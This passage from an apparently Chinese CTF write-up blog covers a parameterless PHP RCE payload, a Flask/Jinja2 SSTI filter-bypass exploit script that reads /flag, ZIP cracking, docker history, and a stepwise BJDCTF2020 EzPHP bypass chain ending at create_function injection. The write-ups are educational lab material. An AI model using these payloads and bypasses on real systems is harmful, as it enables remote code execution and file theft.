<p>故本题的code只能为<code>a(b(c()))</code>这种形式，而不能为<code>a(&#39;xxx&#39;)</code>的形式，为无参数RCE</p>
<p><strong>get_defined_vars()</strong><br>该函数可以返回一个包含所有已定义变量列表的多维数组，这些变量包括环境变量、服务器变量和用户定义的变量。<br><img src="https://img-blog.csdnimg.cn/aad4a2aa5c7a4baba4abfc36fe0431f0.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5Li2QS5SLg==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>当我们传入<br><code>code=var_dump(get_defined_vars());&amp;a=phpinfo();</code><br>两变量时，我们自定义的变量a也出现在输出的变量中，我们便可以利用自定义的变量来绕过对code的限制进行rce<br>我们要想取到我们自定义变量的值，就需要使用函数来获取数组中的某一个值<br><img src="https://img-blog.csdnimg.cn/0aec508325994f079f38d0d9491e4885.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5Li2QS5SLg==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>我们可以在get_defined_vars()前面加一个pos()用来去掉无关的变量</p>
<p><code>code=var_dump(pos(get_defined_vars()));&amp;a=phpinfo();</code><img src="https://img-blog.csdnimg.cn/30015446487143fe8b5795813ded4052.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5Li2QS5SLg==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>如果此时再用一个pos()将会取出code的值，于是我们可以把两个变量的位置交换之后再用pos()便可以取出我们自定义变量的值</p>
<p>最终payload：<br><code>a=system(&#39;cat flag.php&#39;);&amp;code=eval(pos(pos(get_defined_vars())));</code><br>在注释中找到flag<br><img src="https://img-blog.csdnimg.cn/7c65db5869ac4d509784aba5fd165307.png" alt="在这里插入图片描述"></p>
<h2 id="0x02-flask"><a href="#0x02-flask" class="headerlink" title="0x02 flask"></a>0x02 flask</h2><p>一道非常直接的ssti注入，但是有许多过滤的字符</p>
<p><strong>过滤了中括号[ ]</strong><br>利用<code>__getitem__()</code>绕过</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;&#123;().__class__.__mro__[<span class="number">2</span>]&#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&#123;().__class__.__mro__.__getitem__(<span class="number">2</span>)&#125;&#125;</span><br></pre></td></tr></table></figure>
<p><strong>过滤了下划线__</strong><br>利用request对象绕过</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;&#123;().__class__.__bases__[<span class="number">0</span>]&#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&#123;()[request.args.<span class="keyword">class</span>][request.args.bases][<span class="number">0</span>]&#125;&#125;</span><br><span class="line">&amp;<span class="keyword">class</span>=__class__&amp;bases=__bases__</span><br></pre></td></tr></table></figure>
<p><code>request.args.x</code>也可以替换成<code>request.cookies.x</code>和<code>request.headers.x</code>（防止args被过滤）</p>
<p><strong>过滤了点 .</strong><br>如果点 . 也被过滤，且目标是JinJa2（flask）的话，可以使用原生JinJa2函数<code>attr()</code>，即：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">().__class__</span><br><span class="line"></span><br><span class="line">()|attr(<span class="string">&quot;__class__&quot;</span>)</span><br></pre></td></tr></table></figure>

<p><strong>同时过滤了点 . 下划线 __ 中括号 [] 和 args</strong></p>
<p>直接给出exp</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url=<span class="string">&#x27;http://e32aa771.lxctf.net/&#x27;</span></span><br><span class="line">headers=&#123;</span><br><span class="line">    <span class="string">&#x27;name1&#x27;</span>:<span class="string">&#x27;__class__&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;name2&#x27;</span>: <span class="string">&#x27;__base__&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;name3&#x27;</span>: <span class="string">&#x27;__subclasses__&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;name4&#x27;</span>: <span class="string">&#x27;pop&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;name5&#x27;</span>: <span class="string">&#x27;__init__&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;name6&#x27;</span>: <span class="string">&#x27;__globals__&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;name7&#x27;</span>: <span class="string">&#x27;__builtins__&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;name8&#x27;</span>: <span class="string">&#x27;open&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;name9&#x27;</span>: <span class="string">&#x27;/flag&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;name10&#x27;</span>: <span class="string">&#x27;read&#x27;</span>,</span><br><span class="line">&#125;</span><br><span class="line">payload=<span class="string">&#x27;/admin?name=&#123;&#123;()|attr(request.headers.name1)|attr(request.headers.name2)|attr(request.headers.name3)()|attr(request.headers.name4)(186)|attr(request.headers.name5)|attr(request.headers.name6)|attr(request.headers.name4)(request.headers.name7)|attr(request.headers.name4)(request.headers.name8)(request.headers.name9)|attr(request.headers.name10)()&#125;&#125;&amp;.js?&#x27;</span></span><br><span class="line">r=requests.get(url+payload,headers=headers)</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br></pre></td></tr></table></figure>
]]></content>
      <tags>
        <tag>命令执行</tag>
        <tag>SSTI</tag>
      </tags>
  </entry>
  <entry>
    <title>HECTF 迷途的狗狗</title>
    <url>/2021/11/14/dog/</url>
    <content><![CDATA[<p><img src="https://img-blog.csdnimg.cn/1dbfb8d789dd47438fe36d48c92296e6.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5Li2QS5SLg==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
<blockquote>
<p>一道简单的misc</p>
</blockquote>
<p><img src="https://img-blog.csdnimg.cn/2ef01c664e354f1cbca986ee3c8cefd1.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5Li2QS5SLg==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
<blockquote>
<p>下载附件后打开压缩包，看到.DS文件和一个加密后的压缩包</p>
</blockquote>
<p><img src="https://img-blog.csdnimg.cn/ceca8b3644cf4cd8af1d046f10c1b4bf.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5Li2QS5SLg==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
<blockquote>
<p>通过压缩包名字可以判断密码为6位数字，题目应该是想让我们用工具爆破，我们选取的工具为John，通过计算压缩包的哈希值来解析出密码</p>
</blockquote>
<p><img src="https://img-blog.csdnimg.cn/eef712d423314477ba96a31df6881d33.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/63a40354a4d645758b7e347c434a2986.png" alt="在这里插入图片描述"></p>
<p><img src="https://img-blog.csdnimg.cn/4260139761914a13b567195791057885.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5Li2QS5SLg==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
<blockquote>
<p>密码即为142345</p>
</blockquote>
<p><img src="https://img-blog.csdnimg.cn/5aa9d9fefbdc46ea99f64039dbea5e54.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5Li2QS5SLg==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
<blockquote>
<p>打开图片后是一只小狗，首先考虑图片隐写</p>
</blockquote>
<p><img src="https://img-blog.csdnimg.cn/948c721d38e14b059dfffc152f529066.png" alt="在这里插入图片描述"></p>
<blockquote>
<p>各种工具都尝试一下，最后发现foremost可以成功</p>
</blockquote>
<p><img src="https://img-blog.csdnimg.cn/c76da3ec31a04c36a12a32fe7cf086ad.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5Li2QS5SLg==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br><strong>得到flag</strong></p>
]]></content>
      <tags>
        <tag>Misc</tag>
        <tag>隐写</tag>
      </tags>
  </entry>
  <entry>
    <title>HECTF EDGnb</title>
    <url>/2021/11/17/edgnb/</url>
    <content><![CDATA[<p><img src="https://img-blog.csdnimg.cn/1c887b66f2714a888bebcc2f42c9d412.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5Li2QS5SLg==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述">一道web的签到题，考察docker的基本命令，因为以前没有接触过，做的时候还是花费了一些时间<br><img src="https://img-blog.csdnimg.cn/7bc32c3f71e64ba9863abbec4126ab97.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5Li2QS5SLg==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
<p>下好了docker以后应该先 <code>docker run -it moth404/edgnb</code>启动容器，第一次需要拉取镜像，加载完毕后出现容器的命令行界面<br><img src="https://img-blog.csdnimg.cn/baacb66ea3d94180b4289bb58d325574.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5Li2QS5SLg==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>尝试用find命令寻找flag文件，发现该容器中有非常多的flag文件，但cat之后都是空的，没有任何内容，那我们就需要换个思路<br><img src="https://img-blog.csdnimg.cn/b0d1178a13924e93bf01000ed1a902a6.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5Li2QS5SLg==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>先用<code>docker images</code>查看镜像，再使用<code>docker history [OPTIONS] IMAGE</code>查看镜像的历史记录，在历史记录中发现flag字样<br><img src="https://img-blog.csdnimg.cn/269ee48ae909400fb94389d7f5b3f57d.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5Li2QS5SLg==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述">在命令后加<code>--no-trunc</code> 显示完整的提交记录，<br>可以得到 FLAG&#x3D;<code>HECTF&#123;EDGnb!EDGnb!!EDGnb!!!EDGnbnbnb&#125;</code></p>
]]></content>
      <tags>
        <tag>docker</tag>
      </tags>
  </entry>
  <entry>
    <title>BJDCTF2020 EzPHP</title>
    <url>/2021/11/17/bjd-ezphp/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>最近经常见到BJDCTF赛题的改版，其中有一道很经典的代码审计题目，写篇博客学习一下</p>
<blockquote>
<p><a href="https://github.com/BjdsecCA/BJDCTF2020">https://github.com/BjdsecCA/BJDCTF2020</a></p>
</blockquote>
<p><img src="https://img-blog.csdnimg.cn/2e7109189ef8406abdcc2c69f565fe83.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5Li2QS5SLg==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
<hr style=" border:solid; width:100px; height:1px;" color=#000000 size=1">



<h1 id="Part-1-主页"><a href="#Part-1-主页" class="headerlink" title="Part 1 (主页)"></a>Part 1 (主页)</h1><p><img src="https://img-blog.csdnimg.cn/ff17fa98b47943d5b17d10b200ecbc7f.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5Li2QS5SLg==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>打开题目之后是一个网页，并没有和解题有关的信息<br><img src="https://img-blog.csdnimg.cn/039f4b4383e7443a9dfba0854146d463.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5Li2QS5SLg==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>查看源代码后发现注释信息中有提示<code>GFXEIM3YFZYGQ4A=</code>，用base解码后得到信息<code>1nD3x.php</code><br><img src="https://img-blog.csdnimg.cn/25d18b638a1b47539767fe336836bdb7.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5Li2QS5SLg==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>访问<code>/1nD3x.php</code>得到源码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>); </span><br><span class="line"></span><br><span class="line"><span class="variable">$file</span> = <span class="string">&quot;1nD3x.php&quot;</span>;</span><br><span class="line"><span class="variable">$shana</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;shana&#x27;</span>];</span><br><span class="line"><span class="variable">$passwd</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;passwd&#x27;</span>];</span><br><span class="line"><span class="variable">$arg</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="variable">$code</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br /&gt;&lt;font color=red&gt;&lt;B&gt;This is a very simple challenge and if you solve it I will give you a flag. Good Luck!&lt;/B&gt;&lt;br&gt;&lt;/font&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_SERVER</span>) &#123; </span><br><span class="line">    <span class="keyword">if</span> (</span><br><span class="line">        <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/shana|debu|aqua|cute|arg|code|flag|system|exec|passwd|ass|eval|sort|shell|ob|start|mail|\$|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|read|inc|info|bin|hex|oct|echo|print|pi|\.|\&quot;|\&#x27;|log/i&#x27;</span>, <span class="variable">$_SERVER</span>[<span class="string">&#x27;QUERY_STRING&#x27;</span>])</span><br><span class="line">        )  </span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;You seem to want to do something bad?&#x27;</span>); </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/http|https/i&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^aqua_is_cute$/&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;debu&#x27;</span>]) &amp;&amp; <span class="variable">$_GET</span>[<span class="string">&#x27;debu&#x27;</span>] !== <span class="string">&#x27;aqua_is_cute&#x27;</span>) &#123; </span><br><span class="line">        <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&quot;file&quot;</span>]; </span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Neeeeee! Good Job!&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125; </span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">die</span>(<span class="string">&#x27;fxck you! What do you want to do ?!&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_REQUEST</span>) &#123; </span><br><span class="line">    <span class="keyword">foreach</span>(<span class="variable">$_REQUEST</span> <span class="keyword">as</span> <span class="variable">$value</span>) &#123; </span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[a-zA-Z]/i&#x27;</span>, <span class="variable">$value</span>))  </span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;fxck you! I hate English!&#x27;</span>); </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$file</span>) !== <span class="string">&#x27;debu_debu_aqua&#x27;</span>)</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;Aqua is the cutest five-year-old child in the world! Isn&#x27;t it ?&lt;br&gt;&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ( <span class="title function_ invoke__">sha1</span>(<span class="variable">$shana</span>) === <span class="title function_ invoke__">sha1</span>(<span class="variable">$passwd</span>) &amp;&amp; <span class="variable">$shana</span> != <span class="variable">$passwd</span> )&#123;</span><br><span class="line">    <span class="title function_ invoke__">extract</span>(<span class="variable">$_GET</span>[<span class="string">&quot;flag&quot;</span>]);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Very good! you know my password. But what is flag?&lt;br&gt;&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;fxck you! you don&#x27;t know my password! And you don&#x27;t know sha1! why you come here!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^[a-z0-9]*$/isD&#x27;</span>, <span class="variable">$code</span>) || </span><br><span class="line"><span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/fil|cat|more|tail|tac|less|head|nl|tailf|ass|eval|sort|shell|ob|start|mail|\`|\&#123;|\%|x|\&amp;|\$|\*|\||\&lt;|\&quot;|\&#x27;|\=|\?|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|print|echo|read|inc|flag|1f|info|bin|hex|oct|pi|con|rot|input|\.|log|\^/i&#x27;</span>, <span class="variable">$arg</span>) ) &#123; </span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;&lt;br /&gt;Neeeeee~! I have disabled all dangerous functions! You can&#x27;t get my flag =w=&quot;</span>); </span><br><span class="line">&#125; <span class="keyword">else</span> &#123; </span><br><span class="line">    <span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line">    <span class="variable">$code</span>(<span class="string">&#x27;&#x27;</span>, <span class="variable">$arg</span>); </span><br><span class="line">&#125; <span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h1 id="Part-2-绕过QUERY-STRING的正则匹配"><a href="#Part-2-绕过QUERY-STRING的正则匹配" class="headerlink" title="Part 2 (绕过QUERY_STRING的正则匹配)"></a>Part 2 (绕过QUERY_STRING的正则匹配)</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="variable">$_SERVER</span>) &#123; </span><br><span class="line">    <span class="keyword">if</span> (</span><br><span class="line">        <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/shana|debu|aqua|cute|arg|code|flag|system|exec|passwd|ass|eval|sort|shell|ob|start|mail|\$|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|read|inc|info|bin|hex|oct|echo|print|pi|\.|\&quot;|\&#x27;|log/i&#x27;</span>, <span class="variable">$_SERVER</span>[<span class="string">&#x27;QUERY_STRING&#x27;</span>])</span><br><span class="line">        )  </span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;You seem to want to do something bad?&#x27;</span>); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p><em><strong>关于$_SERVER</strong></em><br>url: <a href="http://localhost/aaa/index.php?p=222&amp;q=333">http://localhost/aaa/index.php?p=222&amp;q=333</a> </p>
</blockquote>
<blockquote>
<p>结果：<br>$_SERVER[‘QUERY_STRING’] &#x3D; “p&#x3D;222&amp;q&#x3D;333”;<br>$_SERVER[‘REQUEST_URI’] &#x3D; “&#x2F;aaa&#x2F;index.php?p&#x3D;222&amp;q&#x3D;333”;<br>$_SERVER[‘SCRIPT_NAME’] &#x3D; “&#x2F;aaa&#x2F;index.php”;<br>$_SERVER[‘PHP_SELF’] &#x3D; “&#x2F;aaa&#x2F;index.php”;</p>
</blockquote>
<blockquote>
<p>由实例可知：<br>$_SERVER[“QUERY_STRING”] 获取查询 语句，实例中可知，获取的是?后面的值<br>$_SERVER[“REQUEST_URI”] 获取 <a href="http://localhost/">http://localhost</a> 后面的值，包括&#x2F;<br>$_SERVER[“SCRIPT_NAME”] 获取当前脚本的路径，如：index.php $_SERVER[“PHP_SELF”] 当前正在执行脚本的文件名</p>
</blockquote>
<p>审计后续的代码可知有许多参数要传入，而此处的黑名单范围很广，故后续传参是一定需要绕过的，<code>$_SERVER[‘QUERY_STRING’]</code>在读取url时并不会对url进行解码，而<code>$_GET[&#39;x&#39;]</code>是会进行url解码的，所以我们要把可能出现在黑名单的字符串进行url编码后再传入</p>
<h1 id="Part-3-换行绕过preg-match"><a href="#Part-3-换行绕过preg-match" class="headerlink" title="Part 3 (换行绕过preg_match)"></a>Part 3 (换行绕过preg_match)</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/http|https/i&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^aqua_is_cute$/&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;debu&#x27;</span>]) &amp;&amp; <span class="variable">$_GET</span>[<span class="string">&#x27;debu&#x27;</span>] !== <span class="string">&#x27;aqua_is_cute&#x27;</span>) &#123; </span><br><span class="line">        <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&quot;file&quot;</span>]; </span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Neeeeee! Good Job!&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125; </span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">die</span>(<span class="string">&#x27;fxck you! What do you want to do ?!&#x27;</span>);</span><br></pre></td></tr></table></figure>
<p><code>preg_match(&#39;/^aqua_is_cute$/&#39;, $_GET[&#39;debu&#39;])</code>要求debu的值满足正则<code>/^aqua_is_cute$/</code>，<code>^</code>和<code>$</code>用来表示开头和结尾<br><code>$_GET[&#39;debu&#39;] !== &#39;aqua_is_cute&#39;</code>要求debu的值不能强等于<code>&#39;aqua_is_cute&#39;</code><br>这里需要用到<code>preg_match</code>的漏洞进行绕过，常见的方法有换行符绕过、pcre最大回溯上限绕过，这里可以直接在结尾加上<code>%0a</code>即换行符，来进行绕过，同时要进行url编码来绕过黑名单，构造如下</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">deb%<span class="number">75</span>=aq%<span class="number">75</span>a_is_c%<span class="number">75</span>te%<span class="number">0</span>a</span><br></pre></td></tr></table></figure>
<h1 id="Part-4-绕过-REQUEST的字母匹配"><a href="#Part-4-绕过-REQUEST的字母匹配" class="headerlink" title="Part 4 (绕过$_REQUEST的字母匹配)"></a>Part 4 (绕过$_REQUEST的字母匹配)</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="variable">$_REQUEST</span>) &#123; </span><br><span class="line">    <span class="keyword">foreach</span>(<span class="variable">$_REQUEST</span> <span class="keyword">as</span> <span class="variable">$value</span>) &#123; </span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[a-zA-Z]/i&#x27;</span>, <span class="variable">$value</span>))  </span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;fxck you! I hate English!&#x27;</span>); </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
<p>这里的<code>$_REQUEST</code>包括所有以post或者get方式传入的变量，如果含有字母则无法通过，但我们所有的参数构造都离不开字母。<br>这里的绕过方法主要利用<code>$_REQUEST</code>特性，变量post值会优先于get，我们只要在get传入变量后，再用post方式传入数字值进行覆盖即可<br><img src="https://img-blog.csdnimg.cn/c0095313ac24499fbc4fbdf33839b7bf.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5Li2QS5SLg==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
<h1 id="Part-5-file-get-contents绕过"><a href="#Part-5-file-get-contents绕过" class="headerlink" title="Part 5 (file_get_contents绕过)"></a>Part 5 (file_get_contents绕过)</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$file</span>) !== <span class="string">&#x27;debu_debu_aqua&#x27;</span>)</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;Aqua is the cutest five-year-old child in the world! Isn&#x27;t it ?&lt;br&gt;&quot;</span>); </span><br></pre></td></tr></table></figure>
<p><code>file_get_contents</code>可以读取文件内容，但是我们无法在服务器本地找到内容为<code>&#39;debu_debu_aqua&#39;</code>的文件进行读取，而上一部分又过滤了<code>http</code>和<code>https</code>等协议，也无法进行远程包含，这里考虑使用data协议绕过，记得要编码绕过黑名单。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">file=data://text/plain,deb%75_deb%75_aq%75a</span><br></pre></td></tr></table></figure>
<h1 id="Part-6-sha1强比较绕过"><a href="#Part-6-sha1强比较绕过" class="headerlink" title="Part 6 (sha1强比较绕过)"></a>Part 6 (sha1强比较绕过)</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> ( <span class="title function_ invoke__">sha1</span>(<span class="variable">$shana</span>) === <span class="title function_ invoke__">sha1</span>(<span class="variable">$passwd</span>) &amp;&amp; <span class="variable">$shana</span> != <span class="variable">$passwd</span> )&#123;</span><br><span class="line">    <span class="title function_ invoke__">extract</span>(<span class="variable">$_GET</span>[<span class="string">&quot;flag&quot;</span>]);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Very good! you know my password. But what is flag?&lt;br&gt;&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;fxck you! you don&#x27;t know my password! And you don&#x27;t know sha1! why you come here!&quot;</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
<p>很常见的强比较，类似与md5，主要有两种方法，数组绕过和强碰撞，原理可以自行搜索，这里直接数组绕过即可</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">sh%<span class="number">61</span>na[]=<span class="number">1</span>&amp;p%<span class="number">61</span>sswd[]=<span class="number">2</span></span><br></pre></td></tr></table></figure>
<h1 id="Part-7-create-function-注入"><a href="#Part-7-create-function-注入" class="headerlink" title="Part 7 (create_function()注入)"></a>Part 7 (create_function()注入)</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^[a-z0-9]*$/isD&#x27;</span>, <span class="variable">$code</span>) || </span><br><span class="line"><span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/fil|cat|more|tail|tac|less|head|nl|tailf|ass|eval|sort|shell|ob|start|mail|\`|\&#123;|\%|x|\&amp;|\$|\*|\||\&lt;|\&quot;|\&#x27;|\=|\?|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|print|echo|read|inc|flag|1f|info|bin|hex|oct|pi|con|rot|input|\.|log|\^/i&#x27;</span>, <span class="variable">$arg</span>) ) &#123; </span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;&lt;br /&gt;Neeeeee~! I have disabled all dangerous functions! You can&#x27;t get my flag =w=&quot;</span>); </span><br><span class="line">&#125; <span class="keyword">else</span> &#123; </span><br><span class="line">    <span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line">    <span class="variable">$code</span>(<span class="string">&#x27;&#x27;</span>, <span class="variable">$arg</span>); <span class="comment">//此处存在create_function()注入</span></span><br><span class="line">&#125; <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>create_function()注入原理：</p>
</blockquote>
<p>create_function()函数有两个参数<code>$args</code>和<code>$code</code>，用于创建一个lambda样式的函数，首先可以用create_function()创建一个简单函数</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$afunc</span> = <span class="title function_ invoke__">create_function</span>(<span class="string">&#x27;$a, $b&#x27;</span>,<span class="string">&#x27;return ($a+$b);&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$afunc</span>(<span class="number">1</span>,<span class="number">2</span>);</span><br><span class="line"><span class="comment">//输出3</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>以上的函数等价于</p>
